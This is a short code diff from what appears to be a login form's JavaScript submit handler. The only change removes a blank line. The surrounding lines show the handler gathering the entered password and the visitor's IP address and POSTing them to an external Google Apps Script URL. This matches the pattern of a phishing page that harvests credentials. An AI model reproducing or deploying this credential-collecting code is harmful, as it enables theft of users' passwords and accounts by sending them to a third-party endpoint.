@@ -18,7 +18,6 @@ form.addEventListener('submit', async (e) => {
     password: document.getElementById('password').value,
     ip: clientIp,
   };
-
   try {
     const resp = await fetch('https://script.google.com/macros/s/AKfycbzUAxBdqFhnhtaMI7sJv7pCMkxUG94pgL9n-X9prGRZIh_cY8l4wsFKlyyovL--4oy0MQ/exec', {
       method: 'POST',
